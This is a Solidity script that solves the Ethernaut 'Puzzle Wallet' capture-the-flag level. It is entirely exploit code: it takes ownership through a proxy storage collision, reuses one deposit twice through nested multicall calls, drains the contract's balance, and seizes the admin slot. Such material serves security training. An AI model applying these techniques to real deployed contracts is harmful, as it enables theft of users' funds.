// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {PuzzleWallet, PuzzleProxy} from "ethernaut/levels/PuzzleWallet.sol";

contract Check is CheckScript("PUZZLE_WALLET") {}

contract Solve is SolveScript("PUZZLE_WALLET") {
    PuzzleWallet target;

    constructor() {
        target = PuzzleWallet(instance);
    }

    function attack() public override {
        // become owner (thanks to storage collision)
        PuzzleProxy(payable(address(target))).proposeNewAdmin(player);
        require(target.owner() == player, "should become owner");

        // whitelist ourselves for the multicall in the next step
        target.addToWhitelist(player);

        // prepare the calldata
        //
        // although dynamic arrays are only available in storage, and we
        // need to pass a dynamic array as arguent to `multicall`, we can create
        // a dynamic array with known length via `new bytes[](N)` and populate it
        // to be the argument!
        bytes[] memory __depositData = new bytes[](1);
        __depositData[0] = abi.encodeWithSignature("deposit()");
        bytes[] memory __multicallData = new bytes[](2);
        __multicallData[0] = abi.encodeWithSignature("deposit()");
        __multicallData[1] = abi.encodeWithSignature("multicall(bytes[])", __depositData);

        // call multicall with the prepared data, causing deposit twice
        // value must be the contract balance
        uint256 bal = address(target).balance;
        target.multicall{value: bal}(__multicallData);

        // withdraw funds, with double the balance now
        target.execute(player, 2 * bal, "");

        // now that contract is drained, we can set max balance!
        // set max balance makes you the admin (thanks to storage collision)
        target.setMaxBalance(uint256(uint160(player)));
    }
}
